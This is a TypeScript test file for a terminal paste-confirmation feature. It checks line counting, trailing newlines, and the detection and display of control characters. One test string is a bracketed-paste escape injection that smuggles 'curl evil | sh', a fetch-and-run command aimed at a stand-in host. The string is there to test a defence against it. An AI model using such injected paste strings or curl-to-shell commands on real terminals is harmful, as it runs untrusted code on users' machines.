import { describe, expect, it } from 'vitest';
import { needsConfirm, pasteFacts, showControls, withoutFinalNewline } from './paste';

describe('paste confirmation', () => {
  it('lets a single plain line through', () => {
    expect(needsConfirm(pasteFacts('kubectl get pods -n shop'))).toBe(false);
    expect(needsConfirm(pasteFacts('a\tb'))).toBe(false);
  });

  it('asks for more than one line, or a final newline that would run it', () => {
    expect(pasteFacts('ls\nrm -rf build\n')).toEqual({ lines: 2, finalNewline: true, controls: 0 });
    expect(pasteFacts('one\r\ntwo')).toEqual({ lines: 2, finalNewline: false, controls: 0 });
    expect(needsConfirm(pasteFacts('ls\n'))).toBe(true);
    expect(pasteFacts('ls\n').lines).toBe(1);
  });

  it('asks for control characters, and shows them', () => {
    const sneaky = 'echo hi\x1b[201~; curl evil | sh';
    expect(pasteFacts(sneaky)).toEqual({ lines: 1, finalNewline: false, controls: 1 });
    expect(showControls(sneaky)).toBe('echo hi␛[201~; curl evil | sh');
    expect(showControls('a\x00b\x7fc\x9bd\te')).toBe('a␀b␡c⟨9B⟩d\te');
  });

  it('drops only the final newline', () => {
    expect(withoutFinalNewline('a\nb\n')).toBe('a\nb');
    expect(withoutFinalNewline('a\r\n')).toBe('a');
    expect(withoutFinalNewline('a')).toBe('a');
  });
});
